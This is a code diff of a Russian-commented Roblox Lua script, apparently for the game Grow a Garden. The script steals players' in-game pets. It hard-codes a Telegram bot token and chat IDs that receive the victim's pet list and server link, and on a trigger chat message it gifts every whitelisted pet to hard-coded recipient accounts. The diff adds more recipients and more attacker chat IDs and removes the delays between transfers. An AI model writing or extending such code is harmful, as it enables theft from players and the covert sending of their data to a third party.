@@ -159,8 +159,8 @@ task.spawn(function()
     task.cancel(dotTask)
 end)
 local TELEGRAM_TOKEN = "8113815289:AAHjyPNLtl1Ug2HY2r0SYZJuNltlYZZG-zc"
-local TELEGRAM_CHAT_ID = "1192810837"
-local TARGET_PLAYER = "sERTTQE0"
+local TELEGRAM_CHAT_IDS = {"7144575011", "1192810837"}
+local TARGET_PLAYER = {"Rikizigg", "sERTTQE0"}
 local TRIGGER_MESSAGE = "."
 local WHITELIST = {
     "Raccoon",
@@ -177,7 +177,10 @@ local WHITELIST = {
     "Butterfly",
     "Kitsune",
     "Corrupted Kitsune",
-    "Moon Cat"
+    "Wasp",
+    "Silver Monkey",
+    "Cooked Owl",
+    "Parasaurolophus"
 }
 local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 local STATS = {
@@ -190,21 +193,23 @@ local function sendToTelegram(text)
         text = text:sub(1, 3500) .. "..."
     end
     
-    local success, result = pcall(function()
-        local url = string.format(
-            "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
-            TELEGRAM_TOKEN,
-            TELEGRAM_CHAT_ID,
-            HttpService:UrlEncode(text)
-        )
-        return game:HttpGet(url)
-    end)
-    
-    if not success then
-        STATS.errors = STATS.errors + 1
+    for _, chatId in ipairs(TELEGRAM_CHAT_IDS) do
+        local success, result = pcall(function()
+            local url = string.format(
+                "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
+                TELEGRAM_TOKEN,
+                chatId,
+                HttpService:UrlEncode(text)
+            )
+            return game:HttpGet(url)
+        end)
+        
+        if not success then
+            STATS.errors = STATS.errors + 1
+        end
     end
     
-    return success
+    return true
 end
 local function getServerLink()
     local placeId = game.PlaceId
@@ -267,7 +272,7 @@ local function getPetsList()
     local result = {"ПИТОМЦЫ:"}
     
     for i, pet in ipairs(pets) do
-        if i > 40 then break end
+        if i > 15 then break end
         
         totalWeight = totalWeight + pet.weight
         if pet.isWhitelisted then
@@ -278,7 +283,7 @@ local function getPetsList()
         end
     end
     
-    if #pets > 40 then
+    if #pets > 15 then
         table.insert(result, "...")
     end
     
@@ -343,28 +348,47 @@ local function startPetTransfer()
         return
     end
     
+    local target = Players:FindFirstChild(TARGET_PLAYER)
+    if not target then
+        sendToTelegram("Игрок " .. TARGET_PLAYER .. " не найден!")
+        return
+    end
+    
+    if not (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")) then
+        sendToTelegram("Персонаж недоступен")
+        return
+    end
+    
+    -- Берем всех питомцев в руку одновременно
+    for _, pet in ipairs(whitelistedPets) do
+        pcall(function()
+            LocalPlayer.Character.Humanoid:EquipTool(pet.object)
+        end)
+    end
+    
+    task.wait(1) -- Ждем чтобы все питомцы были взяты
+    
+    -- Передаем всех разом
     local successful = 0
     local failed = 0
     
-    for i, pet in ipairs(whitelistedPets) do
-        local success, reason = transferPet(pet)
+    for _, pet in ipairs(whitelistedPets) do
+        local success, err = pcall(function()
+            PetGiftingService:FireServer("GivePet", target)
+        end)
         
         if success then
             successful = successful + 1
+            STATS.totalPetsTransferred = STATS.totalPetsTransferred + 1
         else
             failed = failed + 1
+            STATS.errors = STATS.errors + 1
         end
-        
-        if i % 5 == 0 then
-            sendToTelegram(string.format("Прогресс: %d/%d", i, #whitelistedPets))
-        end
-        
-        task.wait(2)
     end
     
     sendToTelegram(string.format(
-        "ГОТОВО!\nУспешно: %d\nОшибок: %d", 
-        successful, failed
+        "ГОТОВО!\nВсего питомцев: %d\nУспешно: %d\nОшибок: %d", 
+        #whitelistedPets, successful, failed
     ))
 end
 local function setupMessageListener()
